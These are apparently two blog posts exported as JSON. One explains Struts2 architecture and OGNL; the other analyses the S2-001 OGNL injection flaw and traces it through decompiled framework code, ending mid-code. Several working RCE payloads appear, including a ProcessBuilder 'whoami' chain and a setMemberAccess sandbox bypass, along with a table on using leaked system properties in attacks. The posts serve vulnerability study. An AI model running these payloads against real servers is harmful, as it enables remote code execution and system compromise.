[{"title":"Struts2","url":"/2025/09/17/Strust2/","content":"Strut2初次了解一个漏洞的原理，除了查看网络上相关的漏洞分析文章以外，最重要就是一定要自己调试。\n简介Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。\n历史Struts 2 是由 WebWork 框架演变而来的，它并非Struts 1 的直接升级版本，而是吸收了WebWork 的许多优秀特性和架构设计，成为一个独立的框架。底层大量代码直接继承自 WebWork，所以核心类库依然放在 com.opensymphony.xwork2 命名空间下。\nxwork2 就是 Struts2 的“内核”，几乎所有核心功能都在这里：\n\nAction 接口 &#x2F; 默认实现\ncom.opensymphony.xwork2.Action：所有 Action 的顶层接口\ncom.opensymphony.xwork2.ActionSupport：最常用的 Action 基类\n\n\n拦截器机制\ncom.opensymphony.xwork2.interceptor.*：拦截器链的实现，比如参数注入、校验、国际化\n\n\n值栈 (ValueStack)\ncom.opensymphony.xwork2.ognl.OgnlValueStack：核心数据结构，存储 Action 和上下文，供 OGNL 表达式取值\n\n\n配置和容器\ncom.opensymphony.xwork2.config.*：负责加载 struts.xml 等配置\ncom.opensymphony.xwork2.ObjectFactory：创建 Action、结果对象、拦截器\n\n\n校验 (Validation)\ncom.opensymphony.xwork2.validator.*：字段校验和规则定义\n\n\n\nMVCMVC是Model-View-Controller的缩写，它将Web应用分为三层，View层负责用户视图、页面展示等工作；Controller负责应用的逻辑实现，接收View层传入的用户请求，并转发给对应的Model做处理；Model层则负责实现模型，完成数据的处理。在 MVC 或类似架构里，数据流都是按照「View → Controller → Model → Controller → View」这条链路跑的。\n从web.xml判断是否使用Strust2框架web.xml是Java Web应用的部署描述文件，用来配置Servlet、Filter、Listener等组件，以及之间的映射关系，可以分析此xml知道Web项目使用了哪些核心组件或框架。Struts2 框架的核心是一个 Filter,可以搜索StrutsPrepareAndExecuteFilter，含有该Filter,说明该项目使用的是Struts2框架，因为Strust2请求都是经过这个Filter来处理的\n执行过程官方提供的Struts2的架构如图\n\n\nServlet Filters：过滤器链，客户端的所有请求都要经过Filter链的处理。\nStruts Core：Struts2的核心部分。\nInterceptors：Struts2的拦截器。Struts2提供了很多默认的拦截器，可以完成日常开发的绝大部分工作；而我们自定义的拦截器用来实现实际的客户业务需要的功能。\nUser created：由开发人员创建，包括struts.xml、Action、Template。\nWEB资源HTTPServletRequest,HttpSession,ServletContext等原生的Servlet API\n为什么访问Web资源？B\\S应用的Controller中必然需要访问的Web资源:读写Cookie,获取realPath等\nOGNL对象图导航语言用于Java的开源表达式语言，允许开发者运行时获取和设置对象属性，几乎涵盖Java中常见的操作\nOGNL表达式默认在值栈(ValueStack)里取值，请求到来时，Strust2会将Action对象、参数等数据放到值栈\n\n在JSP页面上可以利用OGNL访问到值栈里的属性\n若希望访问值栈中ContextMap中的数据，需要给OGNL表达式加上一个前缀#，如果没有前缀字符#，搜索将在ObjectStack里进行\n\n假设有一个Java对象\nUser user=new User();user.setName=(&quot;Vicky&quot;);user.setAge(23);\n\nOGNL：\nuser.name;                 \t\t\t\t   \t—&gt;访问对象属性\nuser.setName(&quot;Licky&quot;);\t\t\t   —&gt;调用方法，修改名称\nuser.getName().toUpperCase();—&gt;链式调用\nOGNL 不仅能“取值”，还能“执行方法”，这就是它危险的地方。\nOGNL注入利用的高危操作符:\n\n#：访问OGNL上下文里的Map对象(context区)，允许攻击者绕过root栈，直接访问服务器敏感数据或环境变\n\n# session.userId \t\t//访问用户session信息# application.config   //访问全局应用配置//配合其他操作符执行任意代码\n\n\n@：访问已有Java类的静态方法或字段，调用Java核心类方法(如 Runtime、ProcessBuilder)，直接执行系统命令\n\n@java.lang.Math@max(3,5)@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)//结合new,链式调用实现任意命令执行\n\n\nnew：动态创建Java对象，生成任意对象，配合方法调用代码，创建类的实例对象\n\nnew java.util.Date().getTime()new java.lang.ProcessBuilder(&#x27;calc&#x27;).start() // 执行系统命令//配合@调用静态方法或危险方法\n\n\n./[]：访问对象属性&#x2F;集合\n\n@java.lang.Runtime@getRuntime().exec(&#x27;calc&#x27;)  // 点号调用静态方法#session[&#x27;username&#x27;]                          // Map 访问//可链式调用方法或访问内部对象\n\n\n复杂组合\n\n%&#123;(#context=#attr[&#x27;struts.valueStack&#x27;].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;))&#125;\n\n表达式使用链式调用，每个子表达式通过.连接，OGNL 会从左到右依次执行。\n\n(#context=#attr[&#39;struts.valueStack&#39;].context)：获取值栈的上下文对象,得到ValueStack实例，其中包含当前请求相关的数据模型，这个对象的引用赋值给变量#context，后续方便使用\n常见的 context 变量还包括 #session（session map）、#parameters（请求参数 map）、#application（servlet context）等。#attr 则专门用于 request attribute。\n\n\n(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))：修改OGNL成员访问权限控制，绕过沙箱限制，允许任意调用Java方法。\nsetMemberAccess：设置成员访问控制器，OgnlContext暴露的方法\n(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS))：获取ognl.OgnlContext的静态字段DEFAULT_MEMBER_ACCESS。Strust2默认运行时给OgnlContext做一个安全的处理，禁止随便访问私有方法，避免命令执行。这里则替换OGNL提供的默认”无限制”访问对象，允许静态方法与构造器的调用（这正是攻击链常利用的一点）\n\n\n(@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;))：调用 Java 的 Runtime 类执行系统命令 whoami，返回当前服务器用户名\n\nValueStack贯穿整个Action的生命周期(每个Action类的对象实例都拥有一个ValueStack对象).相当于一个数据中转站，在其中保存当前Action对象和其他相关对象。\nStrust2 利用s:property标签和OGNL表达式来读取值栈中属性值\nStruts2 请求到达后，先准备数据环境（ValueStack、ActionContext），再通过 ActionProxy 代理机制调用 Action 的 execute() 方法，过程中拦截器会完成参数注入、校验等工作。\n值栈由两部分组成：\n\nroot（CompoundRoot）：一个 List 集合，里面放 Action 对象、模型对象等，主对象栈，OGNL核心搜索路径。\ncontext（OgnlContext）：一个 Map 集合，存放额外的上下文数据（request、session、application、parameters 等）。\n\n生命周期图来自素十八\n如图得主要出现在拦截器（Interceptor）阶段(参数处理和文件上传拦截)、Action执行阶段(命名空间和重定向处理)、结果渲染（Result）阶段(标签和模板处理)\n","categories":["Struts2"],"tags":["Struts2"]},{"title":"Struts2-s2-001","url":"/2025/09/17/Struts2-s2-001/","content":"S2-001漏洞原理用户提交的数据未被严格校验就被当作OGNL表达式执行，导致RCE(远程代码执行)\n官方描述:WebWork 和 Struts 2 的 altSyntax 特性，该特性允许在文本字符串中嵌入 OGNL 表达式，并对其进行递归解析。当用户通过 HTML 表单提交包含 OGNL 表达式的字符串（例如通过  标签），且表单验证失败时，服务器会重新显示表单并解析用户提交的内容。如果提交的内容包含恶意 OGNL 表达式，服务器会在解析过程中执行这些表达式。\n漏洞影响版本WebWork：2.1（启用 altSyntax 特性）、2.2.0 至 2.2.5\nStruts 2：2.0.0 至 2.0.8\n技术细节\nOGNL 解析逻辑位于 XWork（而不是 WebWork 或 Struts 2）中。\n\n在处理表单字段时，Struts 2 的标签库会调用 TextParseUtil.translateVariables 方法，对字段值进行递归解析，包含其中的变量表达式。\n\n递归解析导致用户提交的 OGNL 表达式被错误地执行，这就是漏洞点。\n\n\n复现测试通过%{...}让Strust2把花括号里的内容当作OGNL表达式求值，然后使用求值结果替换\n在表单输入%{1+1}，页面返回为2，说明被解析\n\n\n\n\n\n用户提交包含%{}的输入，Strust2在处理这些输入时，将用户输入的内容直接传递给后端的处理流程，未对%{}进行过滤\n用户提交的请求被FilterDispatcher捕获，检测到%{}，识别为OGNL表达式，传递给OGNL引擎进行解析\nOGNL引擎根据值栈的上下文(ValueStack,包括Root栈和Context区)执行表达式\n表达式解析\n对于简单的表达式 如%{1+1}直接进行数学运算\n如果表达式 如%{username},OGNL表达式从Root栈顶的Action对象查找getUsername()方法\n如果表达式使用# 如%{#session[&#39;key&#39;]},OGNL访问Context区的session对象\n如果表达式使用@或new 如：%{@java.lang.Runtime@getRuntime().exec(&#39;whoami&#39;)},OGNL 调用 Java 的静态方法或创建对象，执行相应的代码。\n\n\n\nPayload 1%&#123;&quot;Tomcat&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;\n\n\n这是字符串拼接操作\n\n@java.lang.System@getProperty(&quot;user.dir&quot;)：调用Java静态方法System.getProperty获取当前进程的Java的工作目录\n\n常用 key：\n\n\n\nkey\n含义\n\n\n\n&quot;user.dir&quot;\n当前 Java 应用的工作目录（current working directory）\n\n\n&quot;user.home&quot;\n当前用户家目录\n\n\n&quot;os.name&quot;\n操作系统名称\n\n\n&quot;java.version&quot;\nJava 版本\n\n\n&quot;file.separator&quot;\n文件路径分隔符（Windows: \\, Linux: /）\n\n\n\n\n\n\nPayload2%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),  #b=#a.getInputStream(),  #c=new java.io.InputStreamReader(#b),  #d=new java.io.BufferedReader(#c),  #e=new char[50000],  #d.read(#e),  #f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),  #f.getWriter().println(new java.lang.String(#e)),  #f.getWriter().flush(),  #f.getWriter().close()&#125;\n\n\n命令执行\n#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;whoami&quot;})).redirectErrorStream(true).start():创建ProcessBuilder实例，用于执行系统命令。rediectErrorStream(true)调用ProcessBuilder的方法，将标准错误流重定向到标准输出流\n#b=#a.getInputStream()：获取whoami命令的输出流，供后续读取输出内容，#b是字节流不适合直接读取\n#c=new java.io.InputStreamReader(#b)：转换成字符流，便于后续读取\n#d=new java.io.BufferedReader(#c):创建缓冲读取器高效读取字符流#c\n#e=new char[50000]:分配一个字符数组，用于存储读取的命令输出\n#d.read(#e):将输入流中的数据读取到 #e 字符数组中，准备后续处理\n#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;):获取Strust2上下文中的HTTP响应对象，HttpServletResponse 是 Servlet API 的一部分，用于管理 HTTP 响应。\n#f.getWriter().println(new java.lang.String(#e)):将命令输出写入 HTTP 响应流，getWriter用于向HTTP响应写入文本数据，new java.lang.String(#e)将字符串数组#e转化成String对象\n#f.getWriter().flush()：刷新响应流，确保数据发送到客户端，flush强制将缓冲区中的数据写入输出流，确保命令立即发送到客户端，不停止在缓冲区\n#f.getWriter().close():关闭响应流完成输出\n\n\n\nPayload3%&#123;   #req=@org.apache.struts2.ServletActionContext@getRequest(),   #response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),   #response.println(#req.getRealPath(&#x27;/&#x27;)),   #response.flush(),   #response.close() &#125;\n\n\n获取WEB路径\n#req=@org.apache.struts2.ServletActionContext@getRequest():获取当前HTTP请求对象，getRequest是一个静态方法，返回当前请求的HttpServletRequest对象\n#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter():获取 HTTP 响应对象的PrintWriter,getWriter()向HTTP响应写入文本数据。xwork2其实相当于Strust2的”内核“，很多核心功能都在此。\n#response.println(#req.getRealPath(&#39;/&#39;)):把 getRealPath(&#39;/&#39;) 的返回值作为文本写入 HTTP 响应，把服务器上的真实路径直接输出给客户端。#req.getRealPath返回Web 应用上下文根在服务器文件系统上的绝对路径\n\n\n\n拓展信息:\nJava 相关属性\n\n\n\n\n属性\n描述\n利用方式\n\n\n\njava.vendor.url\nJava 供应商的 URL\n获取 Java 供应商信息（如 Oracle），推测 Java 版本或供应商特定的配置。\n\n\njava.vm.specification.version\nJava 虚拟机规范版本\n确定 JVM 版本，判断是否易受特定 Java 漏洞影响（如旧版本的安全问题）。\n\n\njava.vm.specification.vendor\nJava 虚拟机规范供应商\n类似 java.vendor.url，用于推测环境细节。\n\n\njava.vm.specification.name\nJava 虚拟机规范名称\n提供 JVM 规范名称，通常用于环境指纹识别。\n\n\njava.vm.version\nJava 虚拟机实现版本\n精确版本信息，可用于查找针对特定 JVM 版本的漏洞（如反序列化漏洞）。\n\n\njava.vm.vendor\nJava 虚拟机实现供应商\n确定供应商（如 Oracle、OpenJDK），可能影响漏洞利用方式。\n\n\njava.vm.name\nJava 虚拟机实现名称\n提供 JVM 类型（如 HotSpot），用于环境分析。\n\n\njava.specification.version\nJava 运行时环境规范版本\n确定 JRE 版本，可能用于选择针对特定版本的攻击向量。\n\n\njava.specification.vendor\nJava 运行时环境规范供应商\n类似 java.vm.vendor，用于环境指纹。\n\n\njava.specification.name\nJava 运行时环境规范名称\n提供 JRE 规范名称，辅助环境识别。\n\n\njava.class.version\nJava 类格式版本号\n了解编译的类文件版本，可能推测代码兼容性或潜在漏洞。\n\n\njava.class.path\nJava 类路径\n泄露服务器的类加载路径，可能暴露 JAR 文件位置或依赖库信息，辅助文件操作攻击。\n\n\njava.library.path\n加载库时的搜索路径\n泄露本地库路径，可能用于定位动态链接库或构造本地库加载攻击。\n\n\njava.ext.dirs\n扩展目录路径\n泄露扩展库路径，可能用于定位额外 JAR 文件或配置。\n\n\n\n操作系统相关属性\n\n\n\n\n属性\n描述\n利用方式\n\n\n\nos.name\n操作系统名称\n确定系统类型（如 Linux、Windows），选择适合的命令或攻击向量。\n\n\nos.arch\n操作系统架构\n确定架构（如 x86_64、arm），选择合适的恶意代码或二进制文件。\n\n\nos.version\n操作系统版本\n确定版本（如 5.4.0-42-generic），查找特定版本的内核漏洞或配置问题。\n\n\n\n文件系统相关属性\n\n\n\n\n属性\n描述\n利用方式\n\n\n\nfile.separator\n文件分隔符（如 Unix 的 /）\n构造文件路径（如 /etc/passwd），用于文件读写或路径遍历攻击。\n\n\npath.separator\n路径分隔符（如 Unix 的 :）\n用于构造类路径或库路径，可能在命令注入中拼接多路径。\n\n\nline.separator\n行分隔符（如 Unix 的 \\n）\n处理多行输出或构造跨平台兼容的脚本。\n\n\njava.io.tmpdir\n默认临时文件路径\n泄露临时目录（如 /tmp），可用于上传恶意文件或写入临时脚本。\n\n\nuser.dir\n用户当前工作目录\n泄露 Web 应用的工作目录（如 /var/www/webapp），与 getRealPath(&#39;/&#39;) 类似。\n\n\nuser.home\n用户主目录\n泄露用户主目录（如 /home/user），可能用于定位用户配置文件或敏感文件。\n\n\n\n用户相关属性\n\n\n\n\n属性\n描述\n利用方式\n\n\n\nuser.name\n用户账户名称\n泄露运行 Web 应用的用户名（如 www-data），类似 whoami，用于提权准备。\n\n\nuser.home\n用户主目录\n泄露用户目录，可能用于定位 .ssh 或配置文件（如 .bashrc）。\n\n\n\n编译器相关属性\n\n\n\n\n属性\n描述\n利用方式\n\n\n\njava.compiler\nJIT 编译器名称\n了解编译器类型，可能用于分析性能或特定编译器漏洞（较少见）。\n\n\n\n\n漏洞分析通过官网得知，大概问题出现在此\n&lt;!DOCTYPE html PUBLIC&quot;-//W3C//DTD XHTML 1.1 Transitional//EN&quot;&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;%@taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;title&gt;Index&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;s:form action=&quot;login&quot;&gt;    &lt;s:textfield label=&quot;password&quot; name=&quot;password&quot;/&gt;     &lt;s:submit/&gt;&lt;/s:form&gt;&lt;/body&gt;&lt;/html&gt;\t\n\n首先运行上述代码可渲染得到一个简单的password框\n在Strust2中，&lt;s:xxx&gt;都是Struts标签库 &lt;s textfield label=&quot;password&quot; name=&quot;password&quot; /&gt;会被渲染HTML&lt;input type=&quot;text&quot;&gt;\n&lt;s:textfield /&gt; 会成为入口点，看起来是渲染了输入框，但背后执行链 它的属性值经过表达式解析、来自 ValueStack，触发漏洞\n\nJSP 渲染时 → Struts 标签调用 doEndTag()。\ndoEndTag()标签是JSP自带的Tag生命周期方法，WEB容器解释执行到自定义标签的结束标记时，就会调用标签处理器的doEndTag方法,执行完后可以向WEB容器返回常量EVAL_PAGE或SKIP_PAGE\n\n\n标签实现内部 → 会调用 findValue() 来解析属性值（如 label、value 等）。\nfindValue()通常在 doEndTag() 的处理流程或渲染方法中，遇到要输出的属性就会调用它。\n\n\nfindValue() 内部 → 使用 OGNL OgnlUtil.getValue(expression, stack) 执行表达式。\n\n接下来是负责处理请求的LoginAction代码：\n/* * Copyright 2006 The Apache Software Foundation. * * Licensed under the Apache License, Version 2.0 (the &quot;License&quot;); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * *      http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an &quot;AS IS&quot; BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */package com.javasecurity;import com.opensymphony.xwork2.ActionSupport;import com.opensymphony.xwork2.conversion.annotations.Conversion;/** *  */@Conversion()public class LoginAction extends ActionSupport &#123;    public String getPassword() &#123;        return password;    &#125;\t//调用SetPassword存入LoginAction的password属性    public void setPassword(String password) &#123;        this.password = password;    &#125;    private String password;\t//执行    public String execute() throws Exception &#123;        return SUCCESS;    &#125;&#125;\n\n然后是Strust2的配置文件strust.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE struts PUBLIC        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.5//EN&quot;        &quot;http://struts.apache.org/dtds/struts-2.5.dtd&quot;&gt;&lt;struts&gt;    &lt;!-- &lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;true&quot; /&gt; --&gt;    &lt;constant name=&quot;struts.devMode&quot; value=&quot;true&quot;/&gt;    &lt;!-- Add packages here --&gt;    &lt;package name=&quot;S2-001&quot; extends=&quot;struts-default&quot;&gt;        &lt;!--Action映射--&gt;        &lt;action name=&quot;login&quot; class=&quot;com.javasecurity.LoginAction&quot;&gt;            &lt;!--当excute()返回success时,跳转--&gt;            &lt;result&gt;/WEB-INF/jsp/index.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;\n\n用户会首先发起一个针对某个Action的请求，后台的Servlet容器，例如Tomcat接收到该请求后会去加载web.xml，根据web.xml中配置的Filter，最后会执行到FilterDispatcher即Struts2的调度中心。\n在Web.xml得知，FilterDispatcher通常会配置在 Filter链的最后，根据Strust2流程，FilterDispatcher将请求交给ActionMapper进行处理，ActionMapper则负责判断当前的请求是否交由Struts2来进行处理。如果经过判断需要Struts2处理，FilterDispatcher会结束FilterChain(负责把请求依次传递给每个 Filter 或最终的 Servlet，同时允许 Filter 拦截、修改或终止请求&#x2F;响应。)的执行，所以需要将FilterDispatcher写在FilterChain的最后。\nweb.xml\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;3.1&quot;&gt;    &lt;display-name&gt;S2-001 Example&lt;/display-name&gt;    &lt;filter&gt;        &lt;filter-name&gt;struts2&lt;/filter-name&gt;        &lt;filter-class&gt;org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class&gt;    &lt;/filter&gt;    &lt;filter-mapping&gt;        &lt;filter-name&gt;struts2&lt;/filter-name&gt;        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;!--拦截所有请求--&gt;    &lt;/filter-mapping&gt;    &lt;welcome-file-list&gt;        &lt;welcome-file&gt;index.jsp&lt;/welcome-file&gt;    &lt;/welcome-file-list&gt;&lt;/web-app&gt;\n\nCtrl+B:FilterDispatcher.class\npublic void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException &#123;        HttpServletRequest request = (HttpServletRequest)req;        HttpServletResponse response = (HttpServletResponse)res;        ServletContext servletContext = this.getServletContext();        String timerKey = &quot;FilterDispatcher_doFilter: &quot;;        try &#123;            UtilTimerStack.push(timerKey);            // 请求预处理            request = this.prepareDispatcherAndWrapRequest(request, response);                        ActionMapping mapping;            try &#123;                // 根据请求路径解析哪个Action                mapping = actionMapper.getMapping(request, this.dispatcher.getConfigurationManager());            &#125; catch (Exception ex) &#123;                LOG.error(&quot;error getting ActionMapping&quot;, ex);                this.dispatcher.sendError(request, response, servletContext, 500, ex);                return;            &#125;                                    if (mapping == null) &#123;                String resourcePath = RequestUtils.getServletPath(request);                if (&quot;&quot;.equals(resourcePath) &amp;&amp; null != request.getPathInfo()) &#123;                    resourcePath = request.getPathInfo();                &#125;                //不是Action请求，而是静态资源（如 JS/CSS），就直接返回静态资源。                if (serveStatic &amp;&amp; resourcePath.startsWith(&quot;/struts&quot;)) &#123;                    String name = resourcePath.substring(&quot;/struts&quot;.length());                    this.findStaticResource(name, request, response);                &#125; else &#123;//否则调用 chain.doFilter，放行给后续 Filter/Servlet。                    chain.doFilter(request, response);                &#125;            &#125; else &#123;                this.dispatcher.serviceAction(request, response, servletContext, mapping);            &#125;        &#125; finally &#123;            try &#123;                ActionContextCleanUp.cleanUp(req);            &#125; finally &#123;                UtilTimerStack.pop(timerKey);            &#125;        &#125;    &#125;\n\n当读取到这些信息后，ActionProxy会创建一个ActionInvocation对象，该对象首先会依次调用Struts2中默认的拦截器，所有的默认拦截器都存储在ActionInvocation对象的interceptors属性中，并通过hasNext方法依次进行调用，相关代码如下DefaultActionInvocation.class:\npublic String invoke() throws Exception &#123;        String profileKey = &quot;invoke: &quot;;        String var14;        try &#123;            UtilTimerStack.push(profileKey);            if (this.executed) &#123;                throw new IllegalStateException(&quot;Action has already executed&quot;);            &#125;            //决定执行拦截器还是执行链            if (this.interceptors.hasNext()) &#123;                final InterceptorMapping interceptor = (InterceptorMapping)this.interceptors.next();                UtilTimerStack.profile(&quot;interceptor: &quot; + interceptor.getName(), new UtilTimerStack.ProfilingBlock&lt;String&gt;() &#123;                    public String doProfiling() throws Exception &#123;                        DefaultActionInvocation.this.resultCode = interceptor.getInterceptor().intercept(DefaultActionInvocation.this);                        return null;                    &#125;                &#125;);            &#125; else &#123;                this.resultCode = this.invokeActionOnly();            &#125;\t\t\t//Action 执行完之后的“结果前处理”            if (!this.executed) &#123;                if (this.preResultListeners != null) &#123;                    for(PreResultListener listener : this.preResultListeners) &#123;                        String _profileKey = &quot;preResultListener: &quot;;                        try &#123;                            UtilTimerStack.push(_profileKey);                            listener.beforeResult(this, this.resultCode);                        &#125; finally &#123;                            UtilTimerStack.pop(_profileKey);                        &#125;                    &#125;                &#125;\t\t\t//执行结果                if (this.proxy.getExecuteResult()) &#123;                    this.executeResult();                &#125;                this.executed = true;            &#125;            var14 = this.resultCode;        &#125; finally &#123;            UtilTimerStack.pop(profileKey);        &#125;        return var14;    &#125;\n\n依次调用，ActionInvocation对象会依次执行所有的拦截器，并最终调用用户自己编写的Action。部分:\n\n\n当拦截器执行完成后，首先就会调用开发者编写的Action中的execute方法，执行完该方法后，会根据Struts.xml配置的信息去查找对应的模板页面，例如JSP、FreeMarker；然后根据对应的模板标签信息，解析成HTML等浏览器可以解析的页面信息后，再按照默认拦截器的相反顺序执行；最终将页面信息封装至Response中。这就是Strut2处理一次用户发来的请求其底层代码执行的流程。\n流程分析运行，在LoginAction中对getPassword和setPassword打断点，输入%{1+1},如图\n可以看到%{1+1}依旧没有执行，意味着要走完ParmestersInterceptor拦截器。为在Struts2执行众多的默认拦截器时，有一个名为params的拦截器，该拦截器对应的权限定类名是com.opensymphony.xwork2.interceptor.ParametersInterceptor，该拦截器会通过调用对应Action的setter方法来为其属性进行赋值；最后，对赋值进行判断，如果password的值为“%{1+1}”，则证明代码执行的行为发生在执行Action之后；如果password的值为2，则证明代码执行的行为发生在Action执行之前。通过这种简单的判断就可以减少漏洞点的搜索范围。\n一步步F7之后return SUCCESS，此之前主要做了参数注入，以及OGNL的上下文保护和恢复，执行Action.excute()\n\n从代码可以得，strust2使用了自定义标签，也就是uri=&quot;/struts-tags&quot;\n\n\n\n\n&lt;name&gt;textfield&lt;name&gt;对应JSP就是&lt;s:textfield /&gt;\n\n&lt;tag-class&gt;org.apache.struts2.views.jsp.ui.TextFieldTag&lt;/tag-class&gt;告诉 JSP 引擎：遇到 &lt;s:textfield&gt; 就要调用这个 Java 类来处理。\n\n\nCtrl+B得到TextFieldTag.class\n//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package org.apache.struts2.views.jsp.ui;import com.opensymphony.xwork2.util.ValueStack;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import org.apache.struts2.components.Component;import org.apache.struts2.components.TextField;public class TextFieldTag extends AbstractUITag &#123;    private static final long serialVersionUID = 5811285953670562288L;    protected String maxlength;    protected String readonly;    protected String size;\t/*通过getBean方法创建TextField组件,传入ValueStack、HttpServletRequest和HttpServletResponse*/    public Component getBean(ValueStack stack, HttpServletRequest req, HttpServletResponse res) &#123;        /*TextFieldTag 只是桥梁，把 JSP 标签传来的参数传给 TextField。        它本身不做 OGNL 表达式解析。*/        return new TextField(stack, req, res);    &#125;\t/*设置 TextField 组件的属性*/    protected void populateParams() &#123;        super.populateParams();        TextField textField = (TextField)this.component;        textField.setMaxlength(this.maxlength);        textField.setReadonly(this.readonly);        textField.setSize(this.size);    &#125;    /** @deprecated */    public void setMaxLength(String maxlength) &#123;        this.maxlength = maxlength;    &#125;    public void setMaxlength(String maxlength) &#123;        this.maxlength = maxlength;    &#125;    public void setReadonly(String readonly) &#123;        this.readonly = readonly;    &#125;    public void setSize(String size) &#123;        this.size = size;    &#125;&#125;\n\n根据JSP自定义标签生命周期(下述）查找入口点即doStartTag(),JSP 引擎看到 &lt;s:textfield&gt; 时，会调用 doStartTag()，这是标签解析的“起点”。\n\n\n\nTextFieldTag 继承了 AbstractUITag，而 AbstractUITag 继承自 ComponentTagSupport。ComponentTagSupport.class\n//// Source code recreated from a .class file by IntelliJ IDEA// (powered by FernFlower decompiler)//package org.apache.struts2.views.jsp;import com.opensymphony.xwork2.inject.Container;import com.opensymphony.xwork2.util.ValueStack;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import javax.servlet.jsp.JspException;import org.apache.struts2.components.Component;import org.apache.struts2.dispatcher.Dispatcher;public abstract class ComponentTagSupport extends StrutsBodyTagSupport &#123;    protected Component component;    public abstract Component getBean(ValueStack var1, HttpServletRequest var2, HttpServletResponse var3);\t/*完成组件的渲染并清理资源，确保标签生命周期正确结束 处理结束时/&gt; / &lt;/s:textfield&gt;*/    public int doEndTag() throws JspException &#123;        //调用component.end渲染最终的HTML        this.component.end(this.pageContext.getOut(), this.getBody());        this.component = null;        return 6;    &#125;\t/*控制标签的初始化和渲染逻辑，决定是否需要处理标签体*/    public int doStartTag() throws JspException &#123;        this.component = this.getBean(this.getStack(), (HttpServletRequest)this.pageContext.getRequest(), (HttpServletResponse)this.pageContext.getResponse());        Container container = Dispatcher.getInstance().getContainer();        container.inject(this.component);        this.populateParams();        boolean evalBody = this.component.start(this.pageContext.getOut());        if (evalBody) &#123;            return this.component.usesBody() ? 2 : 1;        &#125; else &#123;            return 0;        &#125;    &#125;    protected void populateParams() &#123;        this.component.setId(this.id);    &#125;    public Component getComponent() &#123;        return this.component;    &#125;&#125;\n\n未直接处理用户输入，跟进UIBean\n注:\n\n\n\n\n方法\n作用\n执行细节\n\n\n\ndoStartTag()\n标签开始时调用\n1. 调用 getBean() 创建 Component 对象  2. 注入依赖  3. 调用 populateParams() 填充参数  4. 调用 component.start() 决定是否处理标签体\n\n\ndoEndTag()\n标签结束时调用\n1. 调用 component.end() 渲染最终 HTML  2. 清理 Component 对象，保证 JSP 标签可复用\n\n\n\n\n\n\n\n\n\n......public boolean end(Writer writer, String body) &#123;    this.evaluateParams();//解析标签参数、求值 OGNL    try &#123;        super.end(writer, body, false);        this.mergeTemplate(writer, this.buildTemplateName(this.template, this.getDefaultTemplate()));    &#125; catch (Exception e) &#123;        LOG.error(&quot;error when rendering&quot;, e);    &#125; finally &#123;        this.popComponentStack();    &#125;    return false;&#125;......        public void evaluateParams() &#123;        this.addParameter(&quot;templateDir&quot;, this.getTemplateDir());        this.addParameter(&quot;theme&quot;, this.getTheme());        String name = null;        if (this.key != null) &#123;            if (this.name == null) &#123;                this.name = this.key;            &#125;            if (this.label == null) &#123;                this.label = &quot;%&#123;getText(&#x27;&quot; + this.key + &quot;&#x27;)&#125;&quot;;            &#125;        &#125;        if (this.name != null) &#123;            name = this.findString(this.name);// OGNL 表达式求值            this.addParameter(&quot;name&quot;, name);// 放入参数 map        &#125;        if (this.label != null) &#123;            this.addParameter(&quot;label&quot;, this.findString(this.label));        &#125;        if (this.labelPosition != null) &#123;            this.addParameter(&quot;labelposition&quot;, this.findString(this.labelPosition));        &#125;        if (this.requiredposition != null) &#123;            this.addParameter(&quot;requiredposition&quot;, this.findString(this.requiredposition));        &#125;        if (this.required != null) &#123;            this.addParameter(&quot;required&quot;, this.findValue(this.required, Boolean.class));        &#125;        if (this.disabled != null) &#123;            this.addParameter(&quot;disabled&quot;, this.findValue(this.disabled, Boolean.class));        &#125;        if (this.tabindex != null) 